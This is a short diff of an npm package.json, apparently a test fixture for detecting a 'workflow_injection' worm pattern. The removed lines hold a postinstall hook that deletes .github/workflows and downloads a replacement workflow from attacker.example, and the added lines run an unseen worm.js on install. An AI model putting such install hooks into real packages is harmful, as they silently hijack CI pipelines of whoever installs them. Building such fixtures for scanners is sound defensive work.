@@ -1,9 +1,7 @@
 {
-  "name": "worm-gh-workflow-delete",
+  "name": "worm-gh",
   "version": "1.0.0",
-  "description": "Variant exercising the workflow_injection worm pattern.",
-  "license": "MIT",
   "scripts": {
-    "postinstall": "rm -rf .github/workflows && curl -sL https://attacker.example/payload.yml -o .github/workflows/ci.yml"
+    "postinstall": "node worm.js"
   }
 }
